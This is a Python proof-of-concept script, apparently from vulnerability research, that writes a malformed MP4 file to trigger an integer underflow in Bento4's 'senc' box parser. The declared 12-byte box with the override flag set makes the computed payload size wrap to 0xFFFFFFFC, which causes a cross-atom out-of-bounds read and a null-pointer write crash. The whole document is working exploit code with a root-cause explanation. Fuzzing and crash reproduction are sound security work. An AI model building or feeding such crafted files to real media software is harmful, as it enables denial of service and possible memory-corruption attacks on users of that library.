#!/usr/bin/env python3
"""
PoC Generator for vuln_001:
SENC OVERRIDE Flag Payload-Size Undercomputation -> Out-of-Bounds Stream Read

Root cause (Ap4CommonEncryption.cpp ~line 3193):
  When senc flags bit-0 is set, the constructor reads
    3 (algorithm_id) + 1 (per_sample_iv_size) + 16 (KID) + 4 (sample_count) = 24 bytes
  from the stream, but then computes:
    payload_size = size - GetHeaderSize() - 4
                 = size - 12 - 4
  WITHOUT subtracting the 20 override bytes already consumed.

Trigger path that produces an unsigned underflow / OOB-null-write crash:
  Make the senc box exactly 12 bytes (header only, no content bytes).
  payload_size = 12 - 12 - 4 = 0xFFFFFFFC  (uint32 wraps!)
  m_SampleInfos.SetDataSize(0xFFFFFFFC) fails (can't alloc ~4 GB).
  stream.Read(m_SampleInfos.UseData(), 0xFFFFFFFC)
    => stream.Read(NULL, 0xFFFFFFFC)  -- writes to NULL pointer -> crash

  The 24 bytes consumed by the override-field reads themselves already
  cross into the next atom in the file stream, which is a secondary OOB.
"""

import struct
import os

OUTPUT_PATH = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_h/vuln_001.mp4"

def box(type4, data):
    """Create a basic box: size(4B BE) + type(4B) + data"""
    return struct.pack('>I', 8 + len(data)) + type4 + data

def fullbox(type4, version, flags, data):
    """Create a full box: size(4B) + type(4B) + version(1B) + flags(3B) + data"""
    flags_bytes = struct.pack('>I', flags)[1:]  # 3 bytes big-endian
    header = struct.pack('>B', version) + flags_bytes
    return box(type4, header + data)

def raw_box(type4, version, flags, inner_bytes):
    """Build senc header manually so we can set a custom size."""
    # size(4) + type(4) + version(1) + flags(3) = 12 bytes, then inner_bytes appended
    # but we set size = 12 regardless of inner_bytes length
    size_field = struct.pack('>I', 12)          # declare size = 12 (header only)
    type_field = type4                           # 4 bytes
    ver_flags  = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 4 bytes
    return size_field + type_field + ver_flags + inner_bytes

# ---- ftyp box (24 bytes) ----
ftyp = box(b'ftyp',
    b'iso5'
    + struct.pack('>I', 0)
    + b'iso5'
    + b'iso6'
    + b'mp41'
)

# ---- mvhd version 0 (108 bytes total) ----
mvhd_data  = struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # times + rate
mvhd_data += struct.pack('>H', 0x0100)                           # volume
mvhd_data += b'\x00' * 10                                        # reserved
mvhd_data += struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)                                             # identity matrix
mvhd_data += b'\x00' * 24                                        # pre_defined
mvhd_data += struct.pack('>I', 2)                                 # next_track_id
mvhd = fullbox(b'mvhd', 0, 0, mvhd_data)

moov = box(b'moov', mvhd)

# ---- mfhd (movie fragment header) ----
mfhd = fullbox(b'mfhd', 0, 0, struct.pack('>I', 1))  # sequence_number = 1

# ---- tfhd (track fragment header) ----
tfhd = fullbox(b'tfhd', 0, 0, struct.pack('>I', 1))  # track_id = 1

# ---- senc full atom: size=12, flags=0x000001 (OVERRIDE), NO CONTENT BYTES ----
#
# The declared size is 12 (= full atom header only: 4+4+1+3).
# When parsed:
#   ReadFullHeader consumes 4 bytes (version+flags), stream cursor = 12
#   AP4_CencSampleEncryption ctor reads 24 override+count bytes PAST end of box
#   payload_size = 12 - 12 - 4 = 0xFFFFFFFC  (unsigned wrap)
#   SetDataSize(0xFFFFFFFC) -> allocation fails -> m_Buffer stays NULL
#   stream.Read(NULL, 0xFFFFFFFC) -> crash / ASAN SEGV / heap-overflow
#
# We append 32 "canary" bytes after the senc header so the 24 override reads
# have data to consume without hitting EOF (preventing early EOS bail-out).
# These bytes are outside the senc box (box declared as 12 bytes), so this
# exactly reproduces the cross-atom OOB read described in the vulnerability.

canary_payload = b'\xDE\xAD\xBE\xEF' * 8   # 32 bytes; enough for 24-byte override read + slack

senc_header_only = raw_box(b'senc', 0, 1, canary_payload)
# Note: raw_box sets the size field to 12, but appends canary_payload after the header.
# From the stream parser's perspective the senc atom is 12 bytes; the factory will
# Seek(start+12) after creation. But the constructor reads beyond 12 bytes BEFORE
# the factory's seek, which is the OOB.

# ---- traf box ----
traf = box(b'traf', tfhd + senc_header_only)

# ---- moof box ----
moof = box(b'moof', mfhd + traf)

# ---- mdat box ----
mdat = box(b'mdat', b'\x00' * 16)

# ---- Assemble file ----
mp4_data = ftyp + moov + moof + mdat

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print(f"  ftyp size : {len(ftyp)}")
print(f"  moov size : {len(moov)}")
print(f"  moof size : {len(moof)}")
print(f"  mdat size : {len(mdat)}")
print(f"  senc declared size: 12  (content = 0 bytes; canary appended in stream)")
print(f"  payload_size after underflow: 0xFFFFFFFC = {0xFFFFFFFC}")
